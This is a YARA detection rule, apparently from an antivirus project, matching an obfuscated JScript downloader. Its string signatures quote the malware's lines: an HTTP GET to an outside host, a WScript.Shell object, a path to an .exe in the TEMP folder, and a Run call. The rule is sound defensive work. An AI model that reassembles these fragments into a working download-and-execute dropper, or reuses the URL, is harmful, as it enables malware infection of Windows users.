rule sig_20160401_cf775dde3895b10acdb0ac8ef2b40a39 {
  meta:
    description = "datamaliciousorder - file 20160401_cf775dde3895b10acdb0ac8ef2b40a39.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bda560cf7fa12dbd669ba855bc3b72c84a133e11b530cadaa5f909c7e5ba6ebf"

  strings:
    $s1  = "QzNl[FkvUpa](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function WqdUiz(LbmTy, OzVkm){ZfyXas = ZfyXas * 1; return LbmTy - OzVkm;};" fullword ascii
    $s3  = "var FntTuq = function FdQp() {return WScript[KkKan](\"WScript\"+\".Shell\");}(), QqNe = 11;" fullword ascii
    $s4  = "if (QzNl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NjEqe(){return CxArm + \"\";};" fullword ascii
    $s6  = "function RyqNu() {return FntTuq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"s25GY2ny.ex\" + \"e\";};" fullword ascii
    $s7  = "function ZpxAd() {return ((QjGt == true) && (QjGt == AdqWhu)) ? 1 : ZfyXas;};" fullword ascii
    $s8  = "QjGt = true; " fullword ascii
    $s9  = "return WqdUiz(ZrpVyd, VpCvy);" fullword ascii
    $s10 = "}while (MjEu);" fullword ascii
    $s11 = "function HisFrh(DgoCk){FntTuq[\"R\"+\"un\"](DgoCk, ZfyXas, ZfyXas);};" fullword ascii
    $s12 = "var AdqWhu = false;" fullword ascii
    $s13 = "var ZtbUvi = new this[\"Date\"]();" fullword ascii
    $s14 = "function RgGc(){return KkKan;};" fullword ascii
    $s15 = "var QjGt = false;" fullword ascii
    $s16 = "function OdkLz()" fullword ascii
    $s17 = "function HndIwd(PbQhe) {var YqEz = (1, 2, 3, 4, 5, PbQhe); return YqEz;};" fullword ascii
    $s18 = "AdqWhu = true; " fullword ascii
    $s19 = "var UrxNak = false;" fullword ascii
    $s20 = "function IqHff(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}